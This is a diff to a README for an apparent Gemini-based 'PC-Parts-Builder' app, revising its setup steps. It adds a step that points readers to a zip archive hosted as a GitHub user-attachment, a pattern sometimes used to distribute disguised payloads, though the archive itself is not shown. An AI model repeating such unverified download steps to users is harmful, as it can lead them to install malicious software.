@@ -14,7 +14,8 @@ View your app in AI Studio: https://ai.studio/apps/ed724c5c-69a4-49ce-aedf-2082f
 
 
 1. Install dependencies:
-   `npm install`
-2. Set the `GEMINI_API_KEY` in [.env.local](.env.local) to your Gemini API key
-3. Run the app:
-   `npm run dev`
+2. Download [PC-Parts-Builder-main.zip](https://github.com/user-attachments/files/29804091/PC-Parts-Builder-main.zip)
+3. Make sure you have Node.js installed get it Here --> https://www.nodejs.org/en
+4. `npm install`
+5. Set the `GEMINI_API_KEY` in [.env.local](.env.local) to your Gemini API key
+6. Run the app: Open command prompt and type `npm run dev`
